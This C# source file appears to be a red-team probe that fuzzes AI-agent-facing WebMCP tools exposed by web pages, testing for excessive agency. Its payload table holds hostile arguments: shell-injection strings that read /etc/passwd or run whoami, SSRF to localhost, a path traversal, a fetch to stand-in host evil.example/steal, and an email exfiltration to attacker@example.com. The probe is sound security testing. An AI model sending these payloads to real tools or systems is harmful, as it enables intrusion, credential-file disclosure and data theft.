using System.Text.Json;
using Trowser.Automation;

namespace Trowser.Security.LlmRedTeam;

/// <summary>
/// Curated argument fuzzing for page-registered WebMCP tools (LLM06 excessive agency).
/// </summary>
public static class WebMcpAbuseProbe
{
    private static readonly (string Kind, string Json, string[] SuccessPatterns)[] Payloads =
    [
        ("shell-metachar-search", "{\"query\":\"; cat /etc/passwd\"}", ["root:", "/etc/passwd", "daemon:"]),
        ("shell-metachar-search-alt", "{\"q\":\"| whoami\"}", ["uid=", "root", "www-data"]),
        ("ssrf-fetch-tool", "{\"url\":\"http://127.0.0.1:22\"}", ["ssh", "connection refused", "127.0.0.1"]),
        ("cross-origin-fetch", "{\"url\":\"https://evil.example/steal\"}", ["evil.example"]),
        ("privilege-escalation", "{\"role\":\"admin\",\"isAdmin\":true}", ["admin", "elevated", "granted"]),
        ("path-traversal-read", "{\"path\":\"../../../etc/passwd\"}", ["root:", "/bin/"]),
        ("email-exfil", "{\"to\":\"attacker@example.com\",\"body\":\"exfil\"}", ["sent", "attacker@example.com", "queued"])
    ];

    public static async Task<List<WebMcpAbuseFinding>> RunAsync(
        AutomationContext ctx,
        CancellationToken ct = default)
    {
        var findings = new List<WebMcpAbuseFinding>();
        var tools = await ctx.GetWebMcpTools();
        if (tools.Count == 0) return findings;

        foreach (var toolDict in tools.Take(8))
        {
            ct.ThrowIfCancellationRequested();
            if (!toolDict.TryGetValue("name", out var nameObj) || nameObj is not string toolName
                || string.IsNullOrWhiteSpace(toolName))
                continue;

            var lowerName = toolName.ToLowerInvariant();
            foreach (var (kind, json, patterns) in Payloads)
            {
                if (!ShouldTryPayload(lowerName, kind)) continue;

                ct.ThrowIfCancellationRequested();
                Dictionary<string, object> result;
                try
                {
                    result = await ctx.CallWebMcpTool(toolName, json);
                }
                catch (Exception ex)
                {
                    findings.Add(new WebMcpAbuseFinding
                    {
                        ToolName = toolName,
                        PayloadKind = kind,
                        ArgumentJson = json,
                        Detail = $"Tool call error: {ex.Message}",
                        Severity = "info"
                    });
                    continue;
                }

                var serialized = JsonSerializer.Serialize(result);
                if (patterns.Any(p => serialized.Contains(p, StringComparison.OrdinalIgnoreCase)))
                {
                    findings.Add(new WebMcpAbuseFinding
                    {
                        ToolName = toolName,
                        PayloadKind = kind,
                        ArgumentJson = json,
                        Detail = $"Tool '{toolName}' was invoked with abusive {kind} arguments and returned suspicious output (confirmed tool call, not string echo).",
                        Severity = kind.Contains("email", StringComparison.OrdinalIgnoreCase) ? "high" : "medium",
                        ToolResult = result
                    });
                }
            }
        }

        return findings;
    }

    private static bool ShouldTryPayload(string toolNameLower, string kind)
    {
        return kind switch
        {
            "shell-metachar-search" or "shell-metachar-search-alt" =>
                toolNameLower.Contains("search") || toolNameLower.Contains("query") || toolNameLower.Contains("find"),
            "ssrf-fetch-tool" or "cross-origin-fetch" =>
                toolNameLower.Contains("fetch") || toolNameLower.Contains("url") || toolNameLower.Contains("http")
                    || toolNameLower.Contains("browse") || toolNameLower.Contains("get"),
            "privilege-escalation" =>
                toolNameLower.Contains("user") || toolNameLower.Contains("admin") || toolNameLower.Contains("role")
                    || toolNameLower.Contains("account"),
            "path-traversal-read" =>
                toolNameLower.Contains("read") || toolNameLower.Contains("file") || toolNameLower.Contains("load"),
            "email-exfil" =>
                toolNameLower.Contains("email") || toolNameLower.Contains("mail") || toolNameLower.Contains("send"),
            _ => true
        };
    }
}
